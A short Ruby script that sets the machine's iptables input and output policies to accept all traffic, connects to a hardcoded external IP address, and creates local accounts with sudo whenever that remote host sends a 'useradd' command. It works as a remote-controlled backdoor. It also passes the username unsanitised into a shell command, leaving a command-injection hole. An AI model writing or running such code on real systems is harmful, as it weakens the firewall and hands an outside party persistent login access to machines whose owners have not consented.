require 'socket'

puts "Process #{Process.pid}"

system "iptables -P INPUT ACCEPT"
system "iptables -P OUTPUT ACCEPT"

socket = TCPSocket.new('52.4.231.97', 2000)
socket.puts("Hey!")

def actions(line)
	command = line.split
	if command[0] == 'useradd'
		create_user(command[1], command[2])
	end
end


def create_user(us,pw)
 pwd = pw.crypt("$5$a1")
        result = system("sudo useradd -m -p '#{ pwd }' #{ us } -s /bin/bash")
        if result
                puts "#{ us } created!"
            else
                puts "#{ us } failed!"
        end
end

while line = socket.gets
	actions(line)
end